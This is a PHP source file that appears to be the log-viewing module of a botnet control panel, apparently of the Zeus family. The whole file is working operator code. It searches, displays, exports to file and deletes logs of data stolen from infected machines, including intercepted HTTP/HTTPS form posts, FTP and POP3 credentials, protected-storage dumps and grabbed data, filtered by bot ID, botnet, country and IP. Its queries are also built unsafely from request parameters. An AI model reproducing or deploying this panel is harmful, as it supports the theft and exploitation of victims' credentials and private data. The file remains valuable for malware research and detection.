<? if(!defined('__INDEX__'))die();
define('OUTPUT_HTML', 0);
define('OUTPUT_TEXT', 1);
define('OUTPUT_FILE', 2);

$edit_a = PRIV & PRIV_LOGS_DB_EDIT;
$popup_menu = 'var cid_menu=[[\''.LNG_MDBLOGS_MENU1.'\',\''.QUERY_STRING_BLANK.'dblogs&date_from=$1$&date_to=$1$&str=&compids=$0$&output='.OUTPUT_TEXT.'\'],[\''.
              LNG_MDBLOGS_MENU2.'\',\''.QUERY_STRING_BLANK.'dblogs&date_from=$1$&date_to=$1$&str=&compids=$0$&output='.OUTPUT_HTML.'\'],[\'\'],'.
              CID_POPUPMENU.'];';
//Показывает выбранный лог
if(isset($_GET['t']) && is_numeric($_GET['t']) && isset($_GET['id']) && is_numeric($_GET['id']))
{
  $tbl = TABLE_LOGS.'_'.$_GET['t'];
  $r = mysql_query('SELECT '.$tbl.'.*, '.TABLE_STATS.'.ftime, '.TABLE_STATS.'.time AS ltime FROM '.$tbl.' LEFT JOIN '.TABLE_STATS.' ON '.TABLE_STATS.'.comp_id='.$tbl.'.comp_id WHERE '.$tbl.'.id='.$_GET['id'].' LIMIT 1');
  if(!$r || mysql_affected_rows() != 1 || !($m = mysql_fetch_assoc($r)))HTMLSmall(LNG_MDBLOGS_VIEW, LNG_MDBLOGS_VIEW_NONE);
  else
  {
    $cid =  '<a onclick="javascript:return ShowMenu(0,cid_menu,Array(),Array(\''.urlencode($m['comp_id']).'\',\''.$_GET['t'].'\'))" href="#" class="ca">'.
            htmlentities($m['comp_id']).'</a>'.HTMLPopupMenuItem(0);
    $data = '<table class="tbl1" width="100%"><tr><td class="td1" colspan="2">'.LNG_MDBLOGS_VIEW.'</td></tr>'. 
            '<tr><td class="tdx1h">'.LNG_MDBLOGS_LOG_CID.  '</td><td class="tdx1" width="100%"><table cellpadding="0" cellspacing="0"><tr><td>'.$cid.'</td><td> / '.htmlentities($m['ip']).' / '.htmlentities($m['country']).'</td></tr></table></td></tr>'.
            '<tr><td class="tdx2h">'.LNG_MDBLOGS_LOG_TIME. '</td><td class="tdx2">'.ftime(LNG_FORMAT_DT, $m['time']).' / '.gmdate(LNG_FORMAT_DT, $m['ftime']).' / '.gmdate(LNG_FORMAT_DT, $m['ltime']).'</td></tr>'.
            '<tr><td class="tdx1h">'.LNG_MDBLOGS_LOG_VERBN.'</td><td class="tdx1">'.int2ver($m['av']).' / '.$m['bn']    .'</td></tr>'.
            '<tr><td class="tdx2h">'.LNG_MDBLOGS_LOG_STIME.'</td><td class="tdx2">'.ftime(LNG_FORMAT_DT, $m['stime']) .', GMT '.TxtGMT($m['gmt']).' / '.TxtTC($m['tc']).'</td></tr>'.
            '<tr><td class="tdx1h">'.LNG_MDBLOGS_LOG_WVER. '</td><td class="tdx1">'.TxtOS($m['os'], $m['lng'])        .'</td></tr>'.
            '<tr><td class="tdx2h">'.LNG_MDBLOGS_LOG_PROC. '</td><td class="tdx2">'.htmlentities($m['proc'])          .'</td></tr></table>'.
            '<table class="tbl1" width="100%" height="100%"><tr height="100%"><td valign="top" class="tdx1" align="left">'.nl2br(htmlspecialchars($m['log'])).'</td></tr></table>';
    HTMLSmall(LNG_MDBLOGS_VIEW, $data, '', $popup_menu);
  }
  die();  
}

//Список доступных баз
$tb_format = TABLE_LOGS.'_';
$tb_size = strlen($tb_format);
$dates_array = array();
$values_array = array();
$dates_count = 0;
if(($r = mysql_query('SHOW TABLES FROM '.MYSQL_DB.' LIKE \''.TABLE_LOGS.'\\_______\'')))while(($m = mysql_fetch_array($r)))$values_array[$dates_count++] = substr($m[0], $tb_size);
sort($values_array);
foreach($values_array as $v)$dates_array[] = substr($v, 4, 2).'.'.substr($v, 2, 2);//.'.'.substr($v, 0, 2);

//Перменные из запроса
if($dates_count > 0)
{
  $cur = time();
  if(isset($_GET['today']))$date_from = $date_to = ftime('y',$cur).ftime('m',$cur).ftime('d',$cur);
  else 
  {
    $date_from = (isset($_GET['date_from']) && is_numeric($_GET['date_from'])) ? $_GET['date_from'] : $values_array[$dates_count - 1];
    $date_to = (isset($_GET['date_to']) && is_numeric($_GET['date_to'])) ? $_GET['date_to'] : $values_array[$dates_count - 1]; 
  }
}
else $date_from = $date_to = 0;
$str       = isset($_GET['str']) ? trim($_GET['str']) : 0;
$botnets   = isset($_GET['botnets']) ? trim($_GET['botnets']) : '';
$compids   = isset($_GET['compids']) ? trim($_GET['compids']) : '';
$countries = isset($_GET['countries']) ? trim($_GET['countries']) : '';
$ips       = isset($_GET['ips']) ? trim($_GET['ips']) : '';
$cs        = (isset($_GET['cs']) && $_GET['cs'] == 1 ? 1 : 0);
$ud        = (isset($_GET['ud']) && $_GET['ud'] == 1 ? 1 : 0);
$nc        = (isset($_GET['nc']) && $_GET['nc'] == 1 ? 1 : 0);
$type      = (isset($_GET['type']) && is_numeric($_GET['type']) ? $_GET['type'] : -1);
$delmode   = ($edit_a && isset($_GET['del']) && $_GET['del'] == 1 ) ? 1 : 0;
$output    = (isset($_GET['output']) && $_GET['output'] >= 0 && $_GET['output'] < 3 && !$delmode ? $_GET['output'] : OUTPUT_HTML);
$nc        = (isset($_GET['nc']) && $_GET['nc'] == 1 ? 1 : 0);
$of        = isset($_GET['of']) ? trim($_GET['of']) : 'resuilt.txt';

$of        = str_replace(array('\\', '/'), '_', $of);
$pp        = pathinfo($of);
if($pp['extension'] != 'txt')$of .= '.txt';

//Вывод
if($output == OUTPUT_TEXT)header('Content-Type: text/plain; charset='.LNG_CODEPAGE);
else
{
  $script = 'function SubmitSearch(frm){};'.
            'function OnOM(){var om=document.getElementById(\'om\');document.getElementById(\'of\').style.visibility=(om.options[om.selectedIndex].value==\''.OUTPUT_FILE.'\'?\'visible\':\'hidden\');}';
  if($edit_a)$script .= 'function DelLogs(frm){if(confirm(\''.addslashes(LNG_MDBLOGS_DELETE1).'\')&&confirm(\''.addslashes(LNG_MDBLOGS_DELETE2).'\')){frm.del.value=1;return true;}return false;}';
  
  HTMLBegin(LNG_MDBLOGS, $script, $popup_menu);
  $tl = explode('|', LNG_MDBLOGS_FILTER_TYPE_L);
  $t2 = explode('|', LNG_MDBLOGS_FILTER_MODES);
  print '<form method="GET" action="'.$_SERVER['PHP_SELF'].'" onsubmit="SubmitSearch(this);"><input type="hidden" name="m" value="'.$module.'">';
  if($edit_a)print '<input type="hidden" name="del" value="0">';
  print '<table class="tbl1" width="1%"><tr><td class="td1" colspan="2">'.LNG_MDBLOGS_FILTER.'</td></tr>'.
        '<tr><td align="left" colspan="2">'.sprintf(LNG_MDBLOGS_FILTER_DATES, InputDate('date_from', $date_from), InputDate('date_to', $date_to)).'</td></tr>'.
        '<tr><td colspan="2" align="center"><table class="tbl1">'.
        '<tr><td align="right">'.LNG_MDBLOGS_FILTER_COUNTRIES.'</td><td><input size="20" type="text" name="countries" value="'.htmlentities($countries).'"></td><td align="right" width="100%">'.LNG_MDBLOGS_FILTER_COMPIDS.'</td><td><input size="20" type="text" name="compids" value="'.htmlentities($compids).'"></td></tr>'.
        '<tr><td align="right">'.LNG_MDBLOGS_FILTER_BOTNETS.'</td><td><input type="text" name="botnets" value="'.htmlentities($botnets).'" size="20"></td><td align="right">'.LNG_MDBLOGS_FILTER_IPS.'</td><td><input type="text" name="ips" value="'.htmlentities($ips).'" size="20"></td></tr>'.
        '</table></td></tr><tr><td colspan="2"><table class="tbl1" width="100%">'.
        '<tr><td>'.LNG_MDBLOGS_FILTER_CONT.'</td><td width="100%" colspan="3"><input type="text" name="str" value="'.htmlentities($str === 0 ? '' : $str).'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MDBLOGS_FILTER_TYPE.'</td><td><select name="type">'.
        '<option value="-1"'.                      ($type == -1                   ? ' selected' : '').'>'.$tl[0].'</option>'.
        '<option value="'.LOGTYPE_HTTP_POST.'"'.   ($type == LOGTYPE_HTTP_POST    ? ' selected' : '').'>'.$tl[1].'</option>'.
        '<option value="'.LOGTYPE_HTTPS_POST.'"'.  ($type == LOGTYPE_HTTPS_POST   ? ' selected' : '').'>'.$tl[2].'</option>'.
        '<option value="-2"'.                      ($type == -2                   ? ' selected' : '').'>'.$tl[3].'</option>'.
        '<option value="'.LOGTYPE_TELNET_FTP.'"'.  ($type == LOGTYPE_TELNET_FTP   ? ' selected' : '').'>'.$tl[4].'</option>'.
        '<option value="'.LOGTYPE_TELNET_POP3.'"'. ($type == LOGTYPE_TELNET_POP3  ? ' selected' : '').'>'.$tl[5].'</option>'.
        '<option value="'.LOGTYPE_GRABBED_DATA.'"'.($type == LOGTYPE_GRABBED_DATA ? ' selected' : '').'>'.$tl[6].'</option>'.
        '<option value="'.LOGTYPE_PSTORE.'"'.      ($type == LOGTYPE_PSTORE       ? ' selected' : '').'>'.$tl[7].'</option>'.
        '<option value="'.LOGTYPE_FTHISTORY.'"'.   ($type == LOGTYPE_FTHISTORY    ? ' selected' : '').'>'.$tl[8].'</option>'.
        '<option value="'.LOGTYPE_UNKNOWN.'"'.     ($type == LOGTYPE_UNKNOWN      ? ' selected' : '').'>'.$tl[9].'</option>'.
        '</select></td><td align="right">'.LNG_MDBLOGS_FILTER_MODE.'</td><td align="right"><select name="output" id="om" onchange="javascript:OnOM();">'.
        '<option value="0"'.($output == OUTPUT_HTML ? ' selected' : '').'>'.$t2[0].'</option>'.
        '<option value="1"'.($output == OUTPUT_TEXT ? ' selected' : '').'>'.$t2[1].'</option>'.
        '<option value="2"'.($output == OUTPUT_FILE ? ' selected' : '').'>'.$t2[2].'</option>'.
        '</select></td></tr>'.
        '<tr><td colspan="2"><input type="checkbox" name="cs" value="1"'.($cs ? ' checked' : '').'>&nbsp;'.LNG_MDBLOGS_FILTER_CS.
        '</td><td colspan="2" align="right"><input style="visibility:'.($output == OUTPUT_FILE ? 'visible' : 'hidden').'" size="20" type="text" id="of" name="of" value="'.htmlentities($of).'"></td></tr>'.
        '<tr><td colspan="4"><input type="checkbox" name="ud" value="1"'.($ud ? ' checked' : '').'>&nbsp;'.LNG_MDBLOGS_FILTER_UD.'</td></tr>'.
        '<tr><td colspan="4"><input type="checkbox" name="nc" value="1"'.($nc ? ' checked' : '').'>&nbsp;'.LNG_MDBLOGS_FILTER_NC.'</td></tr>'.
        '</table></td></tr><tr><td align="left"><input class="ism" type="reset" value="'.LNG_MDBLOGS_FILTER_RESET.'"></td><td align="right"><input id="of" class="ism" type="submit" value="'.LNG_MDBLOGS_FILTER_SEARCH.'">';
  if($edit_a)print '&nbsp;<input class="ism" type="submit" value="'.LNG_MDBLOGS_FILTER_DELETE.'" onClick="return DelLogs(this.form);">';
  print '</td></tr></table></form>';
}
if($str === 0){if($output != OUTPUT_TEXT)HTMLEnd(); die();}

//Формирование запроса
$f = 0;
$query = '';
if($type != -1){$query .= $type == -2 ? '(type=\''.LOGTYPE_HTTP_POST.'\' OR type=\''.LOGTYPE_HTTPS_POST.'\')' : 'type=\''.$type.'\''; $f++;}
if($compids   != '' && $compids   != '*')$query .= Str2SQL($f++, 'comp_id', $compids,   1,   1);
if($botnets   != '' && $botnets   != '*')$query .= Str2SQL($f++, 'bn',      $botnets,   1,   1);
if($countries != '' && $countries != '*')$query .= Str2SQL($f++, 'country', $countries, 1,   1);
if($ips       != '' && $ips       != '*')$query .= Str2SQL($f++, 'ip',      $ips,       1,   1);
if($str       != '' && $str       != '*')$query .= Str2SQL($f++, 'log',     $str,       $cs, 0);
if(!$delmode){if($f)$query = 'WHERE '.$query; if($ud)$query.=' GROUP BY log';}
//print '<hr>'.$query.'<hr>';
if($output == OUTPUT_HTML)$query_hdr = 'SELECT HIGH_PRIORITY id, comp_id, country, ip, SUBSTRING(log, 1, 100), type FROM '.$tb_format;
else $query_hdr = 'SELECT HIGH_PRIORITY id, comp_id, country, ip, log, type, proc, stime, gmt, os, tc, lng, av, bn, time FROM '.$tb_format;
if($output != OUTPUT_TEXT)print '<div class="td1" style="width:100%" align="left">'.LNG_MDBLOGS_RESULT.'</div>';

$file = null;
if($output == OUTPUT_FILE && !($file = fopen($of, 'a')))
{
  print '<b>'.LNG_MDBLOGS_ERROR1.'</b>';
  HTMLEnd();
  die();  
}

//Вывод результата
$cid_count = 0;
$sdb_count = 0;
for($i = 0; $i < $dates_count; $i++)if($values_array[$i] >= $date_from && $values_array[$i] <= $date_to)
{
  $sdb_count++;
  $time = ftime(LNG_FORMAT_DATA, fmktime(0, 0, 0, substr($values_array[$i], 2, 2), substr($values_array[$i], 4,2), substr($values_array[$i], 0, 2) + 2000));
  if($output == OUTPUT_TEXT)print str_repeat('=', 20).' '.$time.' '.str_repeat('=', 20)."\n";
  else
  {
    print '<br><br><div class="td1" style="width:96%" align="left">'.$time.'</div>';
    if($output == OUTPUT_FILE)fwrite($file, str_repeat('=',20).' '.$time.' '.str_repeat('=',20)."\n");
  }
  flush();
  
  if($delmode)
  {
    $total = 0;
    if($query == '')
    {
      if(($r = mysql_query('SELECT COUNT(comp_id) FROM '.$tb_format.$values_array[$i])) && ($mm = mysql_fetch_row($r)))$total = $mm[0];
      mysql_query('DROP TABLE IF EXISTS '.$tb_format.$values_array[$i]);
    }
    else $total = mysql_query('DELETE FROM '.$tb_format.$values_array[$i].' WHERE '.$query) ? mysql_affected_rows() : 0;
    print '<div class="tbl1" style="width:94%" align="center">'.sprintf(LNG_MDBLOGS_DELETE_R, $total).'</div>';
    continue;
  }
   
  $rr = mysql_query($query_hdr.$values_array[$i].' '.$query.' ORDER BY comp_id');
  if(($total = ($rr ? mysql_affected_rows() : 0)) == 0)
  {
    if($output == OUTPUT_TEXT)print "-\n";
    else 
    {
      print '<div class="tbl1" style="width:94%" align="center"><i>'.LNG_MDBLOGS_RESULT_NONE.'</i></div>';
      if($output == OUTPUT_FILE)fwrite($file, "-\n");
    }
    continue;
  }
  
  $lcid = '';
  if($nc && $output == OUTPUT_HTML)print '<div class="tbl1" style="width:94%" align="left">';
  while(($m = mysql_fetch_row($rr)))
  {
    if($lcid != $m[1] && !$nc)
    {
      if($output != OUTPUT_HTML)
      {
        $ff = str_repeat('=', 20)."\n".
              str_pad(LNG_MDBLOGS_LOG_CID,   40).$m[1].' / '.$m[3].' / '.$m[2]."\n".
              str_pad(LNG_MDBLOGS_LOG_VERBN, 40).int2ver($m[12]).' / '.$m[13]."\n".
              str_pad(LNG_MDBLOGS_LOG_WVER,  40).TxtOS($m[9], $m[11])."\n\n";
        $_os = $m[9]; $_lng = $m[11]; $_ver = $m[12]; $_bn = $m[13]; $_ip = $m[3];
        if($output == OUTPUT_TEXT)print $ff;
        else fwrite($file, $ff);
      }
      else
      {
        if($lcid != '')print '</div>';
        print '<div class="tbl1" style="width:94%" align="left"><table cellpadding="0" cellspacing="0"><tr><td>'.
              '<a onclick="javascript:return ShowMenu('.$cid_count.',cid_menu,Array(),Array(\''.urlencode($m[1]).'\',\''.$values_array[$i].'\'))" href="#" class="ca">'.
              htmlentities($m[1]).'</a></td><td>'.HTMLPopupMenuItem($cid_count).'</td></tr><tr><td>'.$m[2].', '.$m[3].'</td></tr></table>';
      }
      $lcid = $m[1];  
      $cid_count++;
    }
    
    if($output != OUTPUT_HTML)
    {
      $ff = str_repeat('-',10)."\n";
      if(!$nc)
      {
        if($_ip  != $m[3]                    )$ff .= str_pad(LNG_MDBLOGS_TXT_N3, 40).($_ip = $m[3])."\n";
        if($_os  != $m[9]  || $_lng != $m[11])$ff .= str_pad(LNG_MDBLOGS_TXT_N1, 40).TxtOS(($_os = $m[9]), ($_lng = $m[11]))."\n";
        if($_ver != $m[12] || $_bn  != $m[13])$ff .= str_pad(LNG_MDBLOGS_TXT_N2, 40).int2ver(($_ver = $m[12])).' / '.($_bn = $m[13])."\n";
      }
      $ff .= str_pad(LNG_MDBLOGS_LOG_TIME,  40).ftime(LNG_FORMAT_DT, $m[14]).' / '.'-'.' / '.'-'."\n".
             str_pad(LNG_MDBLOGS_LOG_STIME, 40).ftime(LNG_FORMAT_DT, $m[7]).', GMT '.TxtGMT($m[8]).' / '.TxtTC($m[10])."\n".
             str_pad(LNG_MDBLOGS_LOG_PROC,  40).$m[6]."\n".str_repeat('-', 10)."\n".$m[4]."\n\n";
      if($output == OUTPUT_TEXT)print $ff;
      else fwrite($file, $ff);
      flush();
    }
    else
    {
      print '<br><a target="_blank" href="'.QUERY_STRING.'&t='.$values_array[$i].'&id='.$m[0].'">[+]</a> ';
      $st = trim($m[4]);
      switch($m[5])
      {
        case LOGTYPE_HTTP_POST:
        case LOGTYPE_HTTPS_POST:
          if(($t = strpos($st,'://')) && ($f = strpos($st,"\n",$t+3)))print htmlentities(substr($st, 0, $f));
          else {print htmlentities($st); if($t && !$f)print '...';}
          break;
        case LOGTYPE_TELNET_FTP:   print '<a href="'.$st.'">'.htmlentities($st).'</a>'; break;
        case LOGTYPE_TELNET_POP3:  print htmlentities($st); break;
        case LOGTYPE_GRABBED_DATA: print $tl[6]; break;
        case LOGTYPE_PSTORE:       print $tl[7]; break;
        case LOGTYPE_FTHISTORY:    print $tl[8]; break;
        default:                   print $tl[9];
      }
    }
  }
  if($output == OUTPUT_FILE)print '<div class="tbl1" style="width:94%" align="center">'.sprintf(LNG_MDBLOGS_WRITED, $total).'</div>';
  if(($lcid && $output != OUTPUT_TEXT) || ($nc && $output == OUTPUT_HTML))print '</div>';
}

if($sdb_count == 0)
{
  if($output == OUTPUT_TEXT)print str_repeat('=', 20).' '.LNG_MDBLOGS_RESULT_DBNONE.' '.str_repeat('=', 20)."\n";
  else
  {
    print '<br><br><div class="td1" style="width:96%" align="left">'.LNG_MDBLOGS_RESULT_DBNONE.'</div>';
    if($output == OUTPUT_FILE)fwrite($file, str_repeat('=', 20).' '.LNG_MDBLOGS_RESULT_DBNONE.' '.str_repeat('=',20)."\n");
  }
}

if($output == OUTPUT_FILE)fclose($file);
if($output != OUTPUT_TEXT)HTMLEnd();
die();

function InputDate($name, $sel)
{
  global $dates_array, $values_array, $dates_count; 
  $data = '';
  if($dates_count == 0)$data .= '<option value="" selected>--.--.--</option>';
  else for($i = 0; $i < $dates_count; $i++)$data .= '<option value="'.$values_array[$i].'"'.($values_array[$i] == $sel ? ' selected' : '').'>'.$dates_array[$i].'</option>';
  return '<select name="'.$name.'">'.$data.'</select>';
}

function Str2Option($name, $data, $f)
{
  if(strstr($data, ',') === FALSE)return ($f ? ' AND ' : ' ').$name.' LIKE BINARY \''.$data.'\'';
  $str = $f ? ' AND (' : ' (';
  $cc = count(($data = explode(',', $data)));
  for($i = 0; $i < $cc; $i++)$str .= ($i > 0 ? ' OR ' : '').$name.' LIKE BINARY \''.trim($data[$i]).'%\'';
  return $str.')';
}

function TxtOS($os, $lng)
{
  $v = explode('.', $os);
  return count($v) == 4 ? sprintf(LNG_MDBLOGS_LOG_WVERD, $v[0], $v[1], $v[2], $v[3], $lng) : '-';
}

function TxtTC($tc)
{
  $tc /= 1000; return sprintf('%02u:%02u:%02u', $tc / 3600, $tc / 60 - (sprintf('%u', ($tc / 3600)) * 60), $tc - (sprintf('%u',($tc / 60)) * 60));
}

function TxtGMT($g)
{
  return ($g > 0 ? '+' : '-').abs(intval($g / 60)).':'.sprintf('%02u', abs(intval($g % 60)));
}
?>